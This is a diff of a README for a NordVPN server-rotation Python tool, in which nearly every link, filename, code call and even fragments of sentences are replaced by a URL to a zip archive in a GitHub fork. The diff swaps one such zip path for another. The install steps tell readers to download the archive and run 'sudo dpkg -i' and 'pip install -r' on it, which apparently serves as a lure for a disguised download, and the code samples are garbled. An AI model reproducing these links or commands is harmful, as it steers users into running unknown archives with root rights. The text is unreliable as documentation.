@@ -1,4 +1,4 @@
-[![Downloads](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+[![Downloads](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 ### New version: 0.2.6
 ***(03/06/2021)***
@@ -9,13 +9,13 @@ Updates for version 0.2.6:
 Updates for version 0.2.5: 
 * **Added a 'complete rotation' functionality**: allows you to rotate between the 4000+ available servers at random. This is different from connecting to a specific region (e.g. country, state), since NordVPN automatically opts for the 'best' server in that particular area. This means you're often connecting to the same small subset of fast servers. When the 'complete rotation' parameter is set to 1, server rotation is truly random. This is a neat function for webscraping purposes.
 
-* **Added a 'skip settings' functionality (for Linux users only)**: Linux users are asked whether they'd like to execute additional settings (such as whitelisting ports) whenever they run the initialize_VPN() function. When the skip_settings parameter is set to 1, nordvpn-switcher will assume the user does not wish to execute additional settings. When the user combines this with the area_input parameter, it is possible to run NordVPN switcher right from the get-go without any required user-input on Linux (see https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip for example code). 
+* **Added a 'skip settings' functionality (for Linux users only)**: Linux users are asked whether they'd like to execute additional settings (such as whitelisting ports) whenever they run the initialize_VPN() function. When the skip_settings parameter is set to 1, nordvpn-switcher will assume the user does not wish to execute additional settings. When the user combines this with the area_input parameter, it is possible to run NordVPN switcher right from the get-go without any required user-input on Linux (see https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip for example code). 
 
 * **The script uses the fake_useragent package** for improved header-input
 
 * **Added an additional pause to slow the script down on Windows.** Some users - especially if they run the NordVPN app on slow machines - are unable to rotate between servers because the app takes a while to start up. 
 
-* **Added more example code** in the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file (see files on Github) 
+* **Added more example code** in the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file (see files on Github) 
 
 
 
@@ -30,7 +30,7 @@ Rotate between different NordVPN servers with ease. Works both on Linux and Wind
 
 Created by Kristof Boghe
 
-# https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip
+# https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip
 
 I realize there are multiple NordVPN-related packages available, but they only work for Linux and/or are not exactly user-friendly. 
 
@@ -69,8 +69,8 @@ This means you're able to share your code with your colleagues without having to
 
 * On Linux, run:
 ```
-wget -qnc https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip
-sudo dpkg -i https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip #replace pathToFile to location download folder
+wget -qnc https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip
+sudo dpkg -i https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip #replace pathToFile to location download folder
 sudo apt update 
 sudo apt install nordvpn
 ```
@@ -78,7 +78,7 @@ sudo apt install nordvpn
 
 * On Windows
 
-Download the app here --> https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip
+Download the app here --> https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip
 
 2. Install the package 
 
@@ -89,7 +89,7 @@ pip install nordvpn-switcher
 
 OR, for the ones who don't use pip for some reason:
 * Download/clone this repository
-* Run `pip install -r https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip` to install dependencies
+* Run `pip install -r https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip` to install dependencies
 
 3. Import functions`from nordvpn_switcher import initialize_VPN,rotate_VPN,terminate_VPN
 
@@ -102,8 +102,8 @@ initialize_VPN(save=1,area_input=['complete rotation'])
 
 for i in range(3):
     rotate_VPN()
-    print('\nDo whatever you want here (https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip). Pausing for 10 seconds...\n')
-    https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip(10)
+    print('\nDo whatever you want here (https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip). Pausing for 10 seconds...\n')
+    https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip(10)
 ```
 will perform a truly random rotation between all available NordVPN servers.
 
@@ -116,13 +116,13 @@ That's it!
 **1. Setting up your NordVPN settings**
 - save: if you want to save these settings for later
 - stored_settings: if you want to execute particular settings already saved in your project folder
-- area_input: if you want to feed a list of connection options (not necessary). Useful when you want to automate the formulation of a server list (see option 5 in the 'some features and options' section). If you want to rotate truly at random between the 4000+ available NordVPN servers, just set this parameter to `['complete rotation']`. If you'd like to rotate between 10 random European countries, set this parameter to  `['random countries europe 10']` etc. See the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file for more examples. 
+- area_input: if you want to feed a list of connection options (not necessary). Useful when you want to automate the formulation of a server list (see option 5 in the 'some features and options' section). If you want to rotate truly at random between the 4000+ available NordVPN servers, just set this parameter to `['complete rotation']`. If you'd like to rotate between 10 random European countries, set this parameter to  `['random countries europe 10']` etc. See the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file for more examples. 
 - skip_settings: only relevant for Linux users, since they are able to execute additional settings. Set this parameter to 1 if you'd like to skip the settings-input. If Linux users combine the this with an area_input, they simply skip entire the step-by-step menu initiated by the initalize_VPN() function.
 
 `initialize_VPN(stored_settings=0,save=0,area_input=None,skip_settings=None)`
 
 **2. Rotating between servers.** 
-- instructions: the instructions saved from the initialize_VPN function. If none is provided, the script looks for a https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file in your project folder (which you can create by setting the `save` parameter in the first function to 1).
+- instructions: the instructions saved from the initialize_VPN function. If none is provided, the script looks for a https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file in your project folder (which you can create by setting the `save` parameter in the first function to 1).
 - google_check: if you want to perform a google and Youtube captcha-check
 
 `rotate_VPN(instructions=None,google_check = 0)`
@@ -134,7 +134,7 @@ That's it!
 
 # How to use
 
-***--> Please check out the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file on GitHub (https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip) for more examples <--***
+***--> Please check out the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file on GitHub (https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip) for more examples <--***
 
 **Option 1: save settings in environment**
 The easiest and most user-friendly (although least automated) way of using NordVPN switcher is by saving the instructions into a new variable and feeding it to the rotate_VPN() function. 
@@ -147,7 +147,7 @@ rotate_VPN(settings)
 rotate_VPN(settings,google_check=1) 
 terminate_VPN(settings)
 ```
-![resulting output option 1](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![resulting output option 1](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 
 In practice, you'll usually execute the rotate_VPN() function within some kind of loop. 
@@ -166,7 +166,7 @@ if you want to rotate between servers in an infinite loop, you can use the while
 ```
 while True: 
     rotate_VPN(settings)
-    https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip(3600) #e.g. rotate servers every hour
+    https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip(3600) #e.g. rotate servers every hour
 ```
 
 Thanks to the area_input parameter and the 'complete rotation' functionality, you don't have to provide any input at all. NordVPN will simply hop from server to server in a truly random fashion. 
@@ -192,13 +192,13 @@ initialize_VPN(save=1)
 
 If `save=1`, the script will write a .txt file in JSON format to your project folder. It contains all the necessary information needed to execute the `rotate_VPN` function. Again, when the instructions parameter is missing in `rotate_VPN`, it will automatically look for the settings file in your project folder.
 
---On Windows, the contents of the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file look something like this (random example): 
+--On Windows, the contents of the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file look something like this (random example): 
 
 `{'opsys': 'Windows', 'command': ['nordvpn', '-c', '-g'], 'settings': ['belgium', 'netherlands', 'germany', 'spain', 'france'],  'original_ip': '82.169.108.182', 'cwd_path': 'C:/Program Files/NordVPN'}
 
 -- On Linux, the file looks slightly different (different random example): 
 
-`{'opsys': 'Linux','original_ip': '82.169.108.182','command': ['nordvpn', 'c'], 'settings': ['United_States', 'Canada', 'Brazil', 'Argentina', 'Mexico', 'Chile', 'Costa_Rica', 'Australia'], 'additional_settings': [['nordvpn', 'set', 'killswitch', 'disable'], ['nordvpn', 'whitelist', 'add', 'port', '23']],'credentials':[['https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip'],['coolpassword]]}`
+`{'opsys': 'Linux','original_ip': '82.169.108.182','command': ['nordvpn', 'c'], 'settings': ['United_States', 'Canada', 'Brazil', 'Argentina', 'Mexico', 'Chile', 'Costa_Rica', 'Australia'], 'additional_settings': [['nordvpn', 'set', 'killswitch', 'disable'], ['nordvpn', 'whitelist', 'add', 'port', '23']],'credentials':[['https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip'],['coolpassword]]}`
 
 Thanks to the saved .txt file, you never need to go through the menu options of `initialize_VPN()` again. So, some time later, you simply perform:
 
@@ -208,7 +208,7 @@ rotate_VPN()
 #do stuff
 terminate_VPN()
 ```
-![resulting output option 2](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![resulting output option 2](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 This option is only relevant for Linux users who wish to execute additional settings such as enabling killswitch etc. Executing these additional settings is not an available option on Windows machines. 
 
@@ -226,11 +226,11 @@ rotate_VPN()
 #do stuff
 terminate_VPN()
 ```
-![resulting output option 3](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![resulting output option 3](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 **Option 4: manual option**
 
-Create or obtain your own https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file, place it in your project folder and use the rotate function#
+Create or obtain your own https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file, place it in your project folder and use the rotate function#
 For example, share particular settings with colleagues/friends who work on the same project by sending them your .txt settings file. Place it in your project folder and just use the `rotate_VPN` function.
 
 ```
@@ -239,7 +239,7 @@ rotate_VPN()
 terminate_VPN()
 ```
 
-**> See the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file for a summary**
+**> See the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file for a summary**
 
 # Some features and options
 
@@ -255,21 +255,21 @@ terminate_VPN()
 
 **2. Provide additional settings and save these for later use, if so desired (only on Linux)**
 
-![additional settings gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![additional settings gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 **3. Login to NordVPN if logged out (only on Linux)**
 
-![login nordvpn](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![login nordvpn](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 **4. Take a random sample from a larger region**
 
-![random sample gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![random sample gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
-**https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip**
+**https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip**
 
-![spellchecker gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![spellchecker gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
-**6. Provide a list of connection options, which will be automatically incorporated into the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip file**
+**6. Provide a list of connection options, which will be automatically incorporated into the https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip file**
 
 ```
 range_servers = range(800,837)
@@ -278,24 +278,24 @@ instructions = initialize_VPN(area_input = server_list)
 rotate_VPN(instructions)
 ```
 
-![server list gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![server list gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 
 **6. NordVPN app starts automatically (if closed) on Windows. Connection process can also be monitored by checking the NordVPN app**
 
-![windows app gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![windows app gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 # Windows vs Linux
 
-* The script runs slower on Windows. This can be explained by the fact that the script communicates directly with https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip, which means it inherits the poor speed performance of the Windows app by definition. Compare the speed of the previous gifs (all executed on a Linux machine) with the following gif, executed on Windows:
+* The script runs slower on Windows. This can be explained by the fact that the script communicates directly with https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip, which means it inherits the poor speed performance of the Windows app by definition. Compare the speed of the previous gifs (all executed on a Linux machine) with the following gif, executed on Windows:
 
-![windows slowness gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip)
+![windows slowness gif](https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip~https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip)
 
 * Linux users have a couple of additional options at their disposal, namely:
 
-https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip able to log in through the Python interface. Windows users need to make sure they're already logged into the NordVPN app. The Windows app remembers your log in by default though, so this shouldn't cause too much trouble. So even when the app is closed, NordVPN-switcher should work.
+https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip able to log in through the Python interface. Windows users need to make sure they're already logged into the NordVPN app. The Windows app remembers your log in by default though, so this shouldn't cause too much trouble. So even when the app is closed, NordVPN-switcher should work.
 
-https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip additional settings (e.g. killswitch etc.)
+https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip additional settings (e.g. killswitch etc.)
 
 * Settings files can't be directly shared between Windows and Linux machines (see option 4 - how to use). Of course, with a little tweaking, separate Windows and Linux settings-files can easily be constructed for your specific project.
 
@@ -313,6 +313,6 @@ I'm pretty sure there are plenty of other viable applications out there. NordVPN
 
 # Questions, problems, nasty bugs to report? 
 
-https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/radiodontia/NordVPN-switcher.zip 
+https://raw.githubusercontent.com/kmbvip/NordVPN-switcher/master/NordVPN_options/Nord_VP_switcher_1.7.zip 
 
 Have fun!
